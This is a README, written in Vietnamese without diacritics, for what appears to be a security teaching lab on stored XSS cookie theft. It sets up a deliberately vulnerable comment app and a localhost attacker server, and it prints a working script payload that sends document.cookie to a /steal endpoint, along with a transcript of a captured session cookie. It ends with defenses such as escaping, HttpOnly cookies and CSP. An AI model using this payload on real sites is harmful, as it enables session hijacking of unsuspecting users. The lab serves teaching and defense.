# Lab 3.2 - Stored XSS trom cookie

Khac reflected: payload khong nam trong URL ma duoc LUU lai (o day la mot comment).
Moi nguoi mo trang comment deu bi payload chay trong trinh duyet cua ho. Day la lab
day du luong trom cookie: payload luu san, nan nhan vo tinh mo trang, cookie session
cua nan nhan bay ve server ke tan cong.

## Thanh phan
- `app.py` : app comment co lo hong, cong 8032. Render comment chua escape.
  `/login` cap cho nan nhan cookie `session` (dat `httponly=False` de minh ho kich ban
  cookie doc duoc tu JavaScript).
- `attacker.py` : server ke tan cong, cong 8033. Endpoint `/steal?c=...` nhan cookie va
  ghi vao `loot.txt`, tra ve anh GIF 1x1 cho muot.
- `exploit.py` : dong vai ke tan cong (dang comment) va nan nhan (mo trang). Vi khong co
  GUI, phan nan nhan duoc mo phong bang client python (xem muc verify).
- `transcript.txt`, `loot.txt` : ket qua that cua lan chay.

## Chay
```bash
python3 attacker.py       # terminal 1, cong 8033
python3 app.py            # terminal 2, cong 8032
python3 exploit.py        # terminal 3
```
Ctrl+C ca hai server khi xong.

## Payload
```html
<script>new Image().src='http://127.0.0.1:8033/steal?c='+encodeURIComponent(document.cookie)</script>
```
Khi trinh duyet nan nhan render comment nay, no tao mot the anh tro toi server ke tan cong,
dinh kem `document.cookie`. Trinh duyet tu dong gui request do: cookie di theo query string.

## Cach verify (khong can trinh duyet)
Hai phan ghep lai thanh bang chung day du:
1. **Phan server la that**: `exploit.py` kiem tra payload da duoc LUU va render NGUYEN VAN
   (khong thanh `&lt;script&gt;`) tren `/`. Nghia la bat ky trinh duyet nao mo trang cung
   nhan duoc the `<script>` va se chay no.
2. **Luong exfil la that tren mang**: vi khong co GUI, `exploit.py` mo phong trinh duyet
   nan nhan: lay dung payload da luu, thay `document.cookie` bang cookie THAT cua nan nhan
   (lay tu phien dang nhap), roi thuc hien dung request ma `new Image().src` se gui. Server
   `attacker.py` nhan that qua HTTP va ghi vao `loot.txt`.

Ket qua that trong `transcript.txt`:
```
cookie nan nhan: {'session': 'victim-session-7f3a9c2b1e'}
[victim] trinh duyet tu dong tai anh: http://127.0.0.1:8033/steal?c=session%3Dvictim-session-7f3a9c2b1e
loot.txt: [....Z] from=127.0.0.1 cookie=session=victim-session-7f3a9c2b1e
```
Cookie session cua nan nhan da nam trong tay ke tan cong. Co cookie nay, ke tan cong co
the dat lai vao trinh duyet minh de chiem phien (session hijacking).

## Phong thu
- Escape output: render comment bang template auto-escape (Jinja2 mac dinh escape, o day
  ta co y noi chuoi tho). `{{ comment.text }}` an toan hon `| safe`.
- Cookie session dat `HttpOnly` (JS khong doc duoc), `Secure`, `SameSite`.
- Content-Security-Policy chan inline script va domain la.
